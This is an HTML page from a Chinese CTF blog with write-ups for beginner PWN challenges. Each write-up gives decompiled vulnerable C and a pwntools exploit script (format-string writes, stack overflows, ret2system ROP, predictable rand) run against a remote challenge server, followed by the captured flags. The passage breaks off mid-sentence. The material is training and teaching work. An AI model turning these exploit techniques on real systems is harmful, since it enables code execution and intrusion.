@@ -1,0 +1,597 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="get_shell直接nc连接cat flag即可：
+1cyberpeace&amp;#123;d1070f116850587b8304cd1aa55565e6&amp;#125;">
+  <meta name="author" content="Hvnt3r">
+  <meta name="keywords" content="CTF, WEB安全, 二进制安全">
+  
+  <title>攻防世界PWN新手练习区题目 - Hvnt3r&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/xcode.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.hvnt3r.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Hvnt3r's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Hvnt3r</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="攻防世界PWN新手练习区题目">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-09-18 23:53" pubdate>
+        2019年9月18日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      43
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">攻防世界PWN新手练习区题目</h1>
+            
+            <div class="markdown-body">
+              <h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h3><p>直接nc连接cat flag即可：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">cyberpeace&#123;d1070f116850587b8304cd1aa<span class="hljs-number">55565e6</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h3 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h3><p>格式化字符串漏洞，<a target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html">漏洞讲解</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> buf; <span class="hljs-comment">// [esp+1Eh] [ebp-7Eh]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+22h] [ebp-7Ah]</span><br>  __int16 v6; <span class="hljs-comment">// [esp+26h] [ebp-76h]</span><br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [esp+28h] [ebp-74h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp+8Ch] [ebp-10h]</span><br><br>  v8 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<br>  buf = <span class="hljs-number">0</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x64</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please tell me your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0xA</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;leave your message please:&quot;</span>);<br>  fgets(&amp;s, <span class="hljs-number">100</span>, <span class="hljs-built_in">stdin</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello %s&quot;</span>, &amp;buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;your message is:&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(&amp;s);<br>  <span class="hljs-keyword">if</span> ( pwnme == <span class="hljs-number">8</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;you pwned me, here is your flag:\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Thank you!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>使用%x定位位置</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm"> ⚡ root<span class="hljs-title">@kali</span> ~ nc <span class="hljs-number">111.198</span>.<span class="hljs-number">29.45</span> <span class="hljs-number">59649</span><br>please tell me your name:<br>hvnt<span class="hljs-number">3</span>r<br>leave your message please:<br>aaaa<span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><br>hello hvnt<span class="hljs-number">3</span>r<br>your message is:<br>aaaaffba<span class="hljs-number">298</span>e.f<span class="hljs-number">77</span><span class="hljs-keyword">c</span><span class="hljs-number">55</span>a<span class="hljs-number">0</span>.f<span class="hljs-number">0</span>b<span class="hljs-number">5</span>ff.ffba<span class="hljs-number">29</span>be.<span class="hljs-number">1</span>.<span class="hljs-keyword">c</span><span class="hljs-number">2.766848</span>fb.<span class="hljs-number">7233746</span>e.a.<span class="hljs-number">61616161.252e7825.78252</span>e<span class="hljs-number">78.2e78252</span>e.<span class="hljs-number">252e7825.78252</span>e<span class="hljs-number">78.2e78252</span>e.<br>Thank you!<br></code></pre></td></tr></table></figure>
+
+<p>定位到printf第一个参数位置位于10，构造脚本，使用%n进行数据写入，需要将pwnme修改为8，因此%n之前有8个字节，使用%10$n定位到第十个偏移量。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>p = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">59649</span>)<br>pwnme = <span class="hljs-number">0x0804A068</span><br> <br>payload1 = <span class="hljs-string">&#x27;qwer&#x27;</span><br>payload2 = p32(pwnme) + <span class="hljs-string">&#x27;aaaa%10$n&#x27;</span><br> <br>p.recvuntil(<span class="hljs-string">&#x27;please tell me your name:\n&#x27;</span>)<br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;leave your message please:\n&#x27;</span>)<br>p.sendline(payload2)<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-built_in">print</span>(p.recv())<br></code></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">7</span>a11a088e83dfd9525a7f575eb43bbe4&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s Your Birth?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>  <span class="hljs-keyword">while</span> ( getchar() != <span class="hljs-number">10</span> )<br>    ;<br>  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">1926</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Cannot Born In 1926!&quot;</span>);<br>    result = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s Your Name?&quot;</span>);<br>    gets(&amp;v4);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You Are Born In %d\n&quot;</span>, v5);<br>    <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">1926</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Shall Have Flag.&quot;</span>);<br>      system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Are Naive.&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Speed One Second Here.&quot;</span>);<br>    &#125;<br>    result = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>溢出，脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">34190</span>)<br>age = p64(<span class="hljs-number">1926</span>)<br> <br>io.recvuntil(<span class="hljs-string">&#x27;What\&#x27;s Your Birth?\n&#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.recvuntil(<span class="hljs-string">&#x27;What\&#x27;s Your Name?\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">8</span> + age)<br><span class="hljs-built_in">print</span>(io.recv())<br></code></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">480</span>d5559a5da195d0d304031d1ca79ad&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  alarm(<span class="hljs-number">0x3C</span>u);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;~~ welcome to ctf ~~     &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;lets get helloworld for bof&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;unk_601068, <span class="hljs-number">0x10</span>uLL);<br>  <span class="hljs-keyword">if</span> ( dword_60106C == <span class="hljs-string">&#x27;nuaa&#x27;</span> )<br>    sub_400686(<span class="hljs-number">0LL</span>, &amp;unk_601068);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>溢出，脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">41373</span>)<br><br>nuaa = p32(<span class="hljs-number">0x6E756161</span>)<br> <br>io.recvuntil(<span class="hljs-string">&#x27;lets get helloworld for bof\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">4</span> + nuaa)<br><span class="hljs-built_in">print</span>(io.recv())<br></code></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">907</span>d57b451589b80d32b742492ffc357&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-80h]</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">512uLL</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">39085</span>)<br><br>eip = p64(<span class="hljs-number">0x400596</span>)<br>payload = <span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">128</span> + <span class="hljs-number">8</span>) + eip<br> <br>io.recvuntil(<span class="hljs-string">&#x27;World\n&#x27;</span>)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">0</span>a5428dc9d0fc7b09735439513d590f0&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>ROP利用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-88h]</span><br><br>  system(<span class="hljs-string">&quot;echo Input:&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>u);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>题目中system与bin&#x2F;sh都已经准备好了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">57085</span>)<br><br>bin_sh = p32(<span class="hljs-number">0x0804A024</span>)<br>sys_addr = p32(<span class="hljs-number">0x08048320</span>)<br>payload = <span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0x88</span> + <span class="hljs-number">4</span>) + sys_addr + <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">4</span> + bin_sh<br> <br>io.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cyberpeace</span><span class="hljs-template-variable">&#123;e626f78a0fd99bf06f22535c5a1eb7d2&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h3><p>考察溢出、伪随机</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">59754</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./guess&#x27;</span>)<br><span class="hljs-built_in">print</span>(elf.libc)<br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Your name:&#x27;</span>)<br>io.sendline(payload)<br>libc.srand(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    num = <span class="hljs-built_in">str</span>(libc.rand()%<span class="hljs-number">6</span>+<span class="hljs-number">1</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;number:&#x27;</span>)<br>    io.sendline(num)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cyberpeace</span><span class="hljs-template-variable">&#123;a6baa716374124aa6541575346d33ebf&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h3><p>rop</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">55082</span>)<br><br>system_addr = <span class="hljs-number">0x0804855A</span><br>bin_sh_addr = <span class="hljs-number">0x0804A080</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * (<span class="hljs-number">0x26</span> + <span class="hljs-number">4</span>) + p32(system_addr) + p32(bin_sh_addr)<br>io.recvuntil(<span class="hljs-string">&#x27;name&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;here:&#x27;</span>)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cyberpeace</span><span class="hljs-template-variable">&#123;f27da510570ddc37586e1c3a6ff92d22&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里记录一下构造栈帧的点，system的地址可以用以下两个：</p>
